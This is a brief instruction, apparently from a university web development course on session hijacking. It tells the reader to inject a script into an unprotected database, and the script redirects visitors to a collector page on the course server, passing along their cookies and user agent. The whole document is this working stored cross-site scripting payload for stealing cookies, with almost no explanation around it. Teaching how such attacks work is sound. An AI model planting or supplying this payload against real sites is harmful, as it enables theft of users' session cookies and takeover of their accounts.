Inject the following script into an unprotected databasei (e.g. php/pdo/posts).

```
<script>
if( document.cookie.indexOf("stolen") < 0) { 
   document.cookie = "stolen=true";
document.location.replace("http://webdev01.boisestate.edu/CS401-resources/php/sessions/hijacking/steal.php?cookie=" + document.cookie + "&userAgent=" + 
   navigator.userAgent);
}
</script>
```
